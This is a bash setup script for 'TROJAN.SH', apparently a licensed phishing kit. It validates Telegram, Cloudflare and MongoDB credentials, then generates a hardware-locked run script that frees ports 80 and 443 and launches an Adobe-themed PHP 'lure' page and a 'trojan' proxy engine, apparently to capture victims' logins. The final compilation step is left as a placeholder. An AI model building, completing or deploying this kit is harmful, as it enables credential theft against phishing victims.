#!/bin/bash
# 🏛️ TROJAN.SH - VERIFIED PRO EDITION
# ------------------------------------------------
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- 1. PRE-INSTALL TOOLS ---
echo -e "${BLUE}[+] Initializing Verification Tools...${NC}"
sudo apt update -y > /dev/null 2>&1
sudo apt install -y curl gnupg mongodb-clients > /dev/null 2>&1

clear
echo -e "${BLUE}--- TROJAN.SH SETUP WIZARD (VERIFIED) ---${NC}"

# --- 2. TELEGRAM VALIDATION ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "[...] Validating Telegram Token..."
    CHECK_TG=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
    if [[ $CHECK_TG == *"\"ok\":true"* ]]; then
        echo -e "${GREEN} VALID${NC}"
        break
    else
        echo -e "${RED} INVALID TOKEN. Try again.${NC}"
    fi
done
read -p "Enter Telegram Chat ID: " TG_ID

# --- 3. CLOUDFLARE VALIDATION ---
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    echo -ne "[...] Validating Cloudflare Token..."
    CHECK_CF=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
         -H "Authorization: Bearer $CF_TOKEN" \
         -H "Content-Type:application/json")
    if [[ $CHECK_CF == *"\"status\":\"active\""* ]]; then
        echo -e "${GREEN} VALID${NC}"
        break
    else
        echo -e "${RED} INVALID TOKEN. Check your permissions.${NC}"
    fi
done

# --- 4. MONGODB VALIDATION ---
while true; do
    read -p "Enter MongoDB User: " MONGO_USER
    read -p "Enter MongoDB Pass: " MONGO_PASS
    echo -ne "[...] Testing MongoDB Connection..."
    # Attempts to list databases; fails if auth is wrong
    CHECK_MONGO=$(mongosh --host localhost --username "$MONGO_USER" --password "$MONGO_PASS" --authenticationDatabase admin --eval "db.adminCommand('listDatabases')" 2>&1)
    if [[ $CHECK_MONGO != *"AuthenticationFailed"* ]]; then
        echo -e "${GREEN} CONNECTED${NC}"
        break
    else
        echo -e "${RED} AUTH FAILED. Check credentials.${NC}"
    fi
done

read -p "Enter Domain (e.g., motarmo.click): " USER_DOMAIN

# --- 5. CREATE THE LICENSED RUN SCRIPT (HWID Gatekeeper) ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

LICENSE_FILE="/root/.license"
CURRENT_DATE=$(date +%s)
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
SECRET_SALT="MY_PRIVATE_PHRASE_2026"
VALID_KEY=$(echo -n "${HWID}${SECRET_SALT}" | md5sum | cut -c1-10 | tr '[:lower:]' '[:upper:]')

if [ -f "$LICENSE_FILE" ]; then
    EXPIRY_DATE=$(cat "$LICENSE_FILE" | cut -d':' -f2)
    if [ "$CURRENT_DATE" -lt "$EXPIRY_DATE" ]; then
        sudo fuser -k 80/tcp 443/tcp 2>/dev/null
        pkill proxy && pkill php
        screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
        screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
        echo -e "${GREEN}[+] Engine LIVE.${NC}"
        exit 0
    else
        rm "$LICENSE_FILE"
    fi
fi

clear
echo -e "${BLUE}[ TROJAN.SH LICENSE PORTAL ]${NC}"
echo -e "${RED}[error] Hardware ID: $HWID is not registered.${NC}"
read -p "ENTER ACTIVATION KEY: " USER_KEY

if [ "$USER_KEY" == "$VALID_KEY" ]; then
    EXPIRY=$(($CURRENT_DATE + 7776000))
    echo "$HWID:$EXPIRY" > "$LICENSE_FILE"
    echo -e "${GREEN}[success] Activated! Valid for 3 months.${NC}"
    ./run.sh
else
    echo -e "${RED}[error] Invalid Key.${NC}"
    exit 1
fi
EOF
chmod +x /root/run.sh

# --- 6. FINISH INSTALLATION ---
# [Insert the rest of the compilation and GUI code here]

echo -e "${GREEN}[+] ALL CREDENTIALS VERIFIED & DEPLOYED.${NC}"
